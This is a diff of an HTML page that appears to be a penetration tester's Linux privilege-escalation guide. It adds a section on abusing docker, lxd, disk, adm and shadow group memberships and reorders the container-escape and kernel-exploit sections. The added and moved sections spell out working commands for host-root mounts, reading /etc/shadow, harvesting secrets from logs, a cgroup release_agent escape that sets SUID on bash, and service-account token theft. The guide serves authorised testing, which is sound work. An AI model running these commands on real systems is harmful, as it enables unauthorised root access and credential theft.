@@ -6465,10 +6465,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#6-container-kubernetes-escapes" class="md-nav__link">
+  <a href="#6-dangerous-group-memberships" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6. Container &amp; Kubernetes Escapes
+        6. Dangerous Group Memberships
       
     </span>
   </a>
@@ -6476,10 +6476,21 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#7-kernel-exploits-last-resort" class="md-nav__link">
+  <a href="#7-container-kubernetes-escapes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        7. Kernel Exploits (Last Resort)
+        7. Container &amp; Kubernetes Escapes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-kernel-exploits-last-resort" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Kernel Exploits (Last Resort)
       
     </span>
   </a>
@@ -8077,10 +8088,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#6-container-kubernetes-escapes" class="md-nav__link">
+  <a href="#6-dangerous-group-memberships" class="md-nav__link">
     <span class="md-ellipsis">
       
-        6. Container &amp; Kubernetes Escapes
+        6. Dangerous Group Memberships
       
     </span>
   </a>
@@ -8088,10 +8099,21 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#7-kernel-exploits-last-resort" class="md-nav__link">
+  <a href="#7-container-kubernetes-escapes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        7. Kernel Exploits (Last Resort)
+        7. Container &amp; Kubernetes Escapes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-kernel-exploits-last-resort" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Kernel Exploits (Last Resort)
       
     </span>
   </a>
@@ -8333,72 +8355,111 @@
 </span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>gdb<span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;<span class="w"> </span>-batch<span class="w"> </span>-ex<span class="w"> </span><span class="s1">'call (char*)getenv("PASSWORD")'</span>
 </span></code></pre></div>
 <hr />
-<h2 id="6-container-kubernetes-escapes">6. Container &amp; Kubernetes Escapes<a class="headerlink" href="#6-container-kubernetes-escapes" title="Permanent link">&para;</a></h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># --- Am I in a container? ---</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ls<span class="w"> </span>-la<span class="w"> </span>/.dockerenv<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/self/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>CapEff
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>capsh<span class="w"> </span>--print
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># --- Docker socket exposed inside the container (game over) ---</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>ls<span class="w"> </span>-la<span class="w"> </span>/var/run/docker.sock
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>docker<span class="w"> </span>-H<span class="w"> </span>unix:///var/run/docker.sock<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-v<span class="w"> </span>/:/host<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/host<span class="w"> </span>/bin/bash
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># --- Privileged container escape (cap_sys_admin) ---</span>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># Mount the host filesystem:</span>
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/host<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mount<span class="w"> </span>/dev/sda1<span class="w"> </span>/mnt/host<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chroot<span class="w"> </span>/mnt/host<span class="w"> </span>/bin/bash
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c1"># Or abuse cgroup release_agent:</span>
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="nv">d</span><span class="o">=</span><span class="k">$(</span>dirname<span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>-x<span class="w"> </span>/s*/fs/c*/*/r*<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n1<span class="k">))</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$d</span>/w<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$d</span>/w/notify_on_release
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="nv">t</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'s/.*upperdir=\([^,]*\).*/\1/p'</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$t</span><span class="s2">/cmd"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$d</span>/release_agent
-</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/sh\nchmod u+s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/cmd<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
-</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">"echo \$\$ &gt; </span><span class="nv">$d</span><span class="s2">/cgroup.procs"</span>
-</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="c1"># --- Service account token &amp; K8s API access ---</span>
-</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>ls<span class="w"> </span>-la<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/
-</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
-</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>kubectl<span class="w"> </span>--token<span class="o">=</span><span class="nv">$TOKEN</span><span class="w"> </span>auth<span class="w"> </span>can-i<span class="w"> </span>--list
-</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="c1"># Apply a reviewed lab manifest only when the ROE explicitly includes a</span>
-</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="c1"># privileged-pod test. The manifest below reads a non-sensitive host marker.</span>
-</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>kubectl<span class="w"> </span>--token<span class="o">=</span><span class="s2">"</span><span class="nv">$TOKEN</span><span class="s2">"</span><span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>privileged-pod.yaml
-</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>
-</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="c1"># --- Other escape vectors ---</span>
-</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="c1"># - nsenter with host PID namespace: nsenter -t 1 -m -u -i -n -p -- bash</span>
-</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="c1"># - /proc/sys/kernel/core_pattern abuse (privileged container)</span>
-</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="c1"># - Writable hostPath mount (e.g. /etc/ mounted into the container)</span>
-</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="c1"># - runc CVE-2024-21626 (Leaky Vessels) / CVE-2019-5736 (runc overwrite)</span>
-</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="c1"># - /dev/kmsg or /sys/fs/cgroup writes from a privileged container</span>
+<h2 id="6-dangerous-group-memberships">6. Dangerous Group Memberships<a class="headerlink" href="#6-dangerous-group-memberships" title="Permanent link">&para;</a></h2>
+<p>Some local groups grant a direct, deterministic path to root. Check your groups before reaching for anything fragile.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>id<span class="w">    </span><span class="c1"># watch for: docker, lxd, lxc, disk, adm, shadow, sudo, wheel, video</span>
 </span></code></pre></div>
-<div class="language-yaml highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># privileged-pod.yaml — lab-only canary manifest.</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Pod</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nt">metadata</span><span class="p">:</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">approved-host-marker</span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nt">spec</span><span class="p">:</span>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">marker</span>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">      </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">alpine</span>
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">      </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">"/bin/sh"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"-c"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"cat</span><span class="nv"> </span><span class="s">/host/etc/hostname"</span><span class="p p-Indicator">]</span>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">      </span><span class="nt">volumeMounts</span><span class="p">:</span>
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">host</span>
-</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">          </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/host</span>
-</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span>
-</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">host</span>
-</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">      </span><span class="nt">hostPath</span><span class="p">:</span>
-</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/</span>
+<ul>
+<li>
+<p><strong><code>docker</code></strong> — effectively root. Mount the host filesystem into a throwaway container:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>sh
+</span></code></pre></div>
+</li>
+<li>
+<p><strong><code>lxd</code> / <code>lxc</code></strong> — import a small image and attach the host disk as a device inside a privileged container:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>lxc<span class="w"> </span>init<span class="w"> </span>alpine<span class="w"> </span>r00t<span class="w"> </span>-c<span class="w"> </span>security.privileged<span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>lxc<span class="w"> </span>config<span class="w"> </span>device<span class="w"> </span>add<span class="w"> </span>r00t<span class="w"> </span>host<span class="w"> </span>disk<span class="w"> </span><span class="nv">source</span><span class="o">=</span>/<span class="w"> </span><span class="nv">path</span><span class="o">=</span>/mnt/root<span class="w"> </span><span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>lxc<span class="w"> </span>start<span class="w"> </span>r00t<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>r00t<span class="w"> </span>/bin/sh<span class="w">   </span><span class="c1"># /mnt/root is the host FS, as root</span>
+</span></code></pre></div>
+</li>
+<li>
+<p><strong><code>disk</code></strong> — raw access to the block device. Read any file (including <code>/etc/shadow</code>) or write with <code>debugfs</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>debugfs<span class="w"> </span>/dev/sda1<span class="w">        </span><span class="c1"># interactive: cat /etc/shadow, or write arbitrary files</span>
+</span></code></pre></div>
+</li>
+<li>
+<p><strong><code>adm</code></strong> — read system logs; credentials and tokens frequently leak into them:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>grep<span class="w"> </span>-riE<span class="w"> </span><span class="s2">"password|token|secret|api[_-]?key"</span><span class="w"> </span>/var/log<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head
+</span></code></pre></div>
+</li>
+<li>
+<p><strong><code>shadow</code></strong> — read <code>/etc/shadow</code> directly, then crack offline (<code>unshadow</code> + hashcat/john).</p>
+</li>
+<li>
+<p><strong><code>sudo</code> / <code>wheel</code></strong> — you can invoke <code>sudo</code>; go back to <code>sudo -l</code> and the GTFOBins paths above.</p>
+</li>
+</ul>
+<div class="admonition warning">
+<p class="admonition-title">Confirm the group is really yours</p>
+<p><code>id</code> shows effective groups; a group you only hold via a secondary login or a file ACL may not grant the device access these techniques assume. Verify with a harmless read before writing anything.</p>
+</div>
+<hr />
+<h2 id="7-container-kubernetes-escapes">7. Container &amp; Kubernetes Escapes<a class="headerlink" href="#7-container-kubernetes-escapes" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># --- Am I in a container? ---</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>ls<span class="w"> </span>-la<span class="w"> </span>/.dockerenv<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/self/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>CapEff
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>capsh<span class="w"> </span>--print
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># --- Docker socket exposed inside the container (game over) ---</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>ls<span class="w"> </span>-la<span class="w"> </span>/var/run/docker.sock
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>docker<span class="w"> </span>-H<span class="w"> </span>unix:///var/run/docker.sock<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-v<span class="w"> </span>/:/host<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/host<span class="w"> </span>/bin/bash
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># --- Privileged container escape (cap_sys_admin) ---</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="c1"># Mount the host filesystem:</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/host<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mount<span class="w"> </span>/dev/sda1<span class="w"> </span>/mnt/host<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chroot<span class="w"> </span>/mnt/host<span class="w"> </span>/bin/bash
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="c1"># Or abuse cgroup release_agent:</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nv">d</span><span class="o">=</span><span class="k">$(</span>dirname<span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>-x<span class="w"> </span>/s*/fs/c*/*/r*<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n1<span class="k">))</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$d</span>/w<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$d</span>/w/notify_on_release
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="nv">t</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'s/.*upperdir=\([^,]*\).*/\1/p'</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$t</span><span class="s2">/cmd"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$d</span>/release_agent
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/sh\nchmod u+s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/cmd<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">"echo \$\$ &gt; </span><span class="nv">$d</span><span class="s2">/cgroup.procs"</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="c1"># --- Service account token &amp; K8s API access ---</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>ls<span class="w"> </span>-la<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>kubectl<span class="w"> </span>--token<span class="o">=</span><span class="nv">$TOKEN</span><span class="w"> </span>auth<span class="w"> </span>can-i<span class="w"> </span>--list
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="c1"># Apply a reviewed lab manifest only when the ROE explicitly includes a</span>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="c1"># privileged-pod test. The manifest below reads a non-sensitive host marker.</span>
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>kubectl<span class="w"> </span>--token<span class="o">=</span><span class="s2">"</span><span class="nv">$TOKEN</span><span class="s2">"</span><span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>privileged-pod.yaml
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="c1"># --- Other escape vectors ---</span>
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="c1"># - nsenter with host PID namespace: nsenter -t 1 -m -u -i -n -p -- bash</span>
+</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="c1"># - /proc/sys/kernel/core_pattern abuse (privileged container)</span>
+</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="c1"># - Writable hostPath mount (e.g. /etc/ mounted into the container)</span>
+</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="c1"># - runc CVE-2024-21626 (Leaky Vessels) / CVE-2019-5736 (runc overwrite)</span>
+</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="c1"># - /dev/kmsg or /sys/fs/cgroup writes from a privileged container</span>
+</span></code></pre></div>
+<div class="language-yaml highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># privileged-pod.yaml — lab-only canary manifest.</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Pod</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nt">metadata</span><span class="p">:</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">approved-host-marker</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nt">spec</span><span class="p">:</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">marker</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">      </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">alpine</span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">      </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">"/bin/sh"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"-c"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"cat</span><span class="nv"> </span><span class="s">/host/etc/hostname"</span><span class="p p-Indicator">]</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">      </span><span class="nt">volumeMounts</span><span class="p">:</span>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">host</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">          </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/host</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">host</span>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">      </span><span class="nt">hostPath</span><span class="p">:</span>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/</span>
 </span></code></pre></div>
 <p>Remove the pod and any generated evidence as soon as the approved validation is complete.</p>
 <hr />
-<h2 id="7-kernel-exploits-last-resort">7. Kernel Exploits (Last Resort)<a class="headerlink" href="#7-kernel-exploits-last-resort" title="Permanent link">&para;</a></h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 1. Identify the exact kernel version</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>uname<span class="w"> </span>-r<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/version
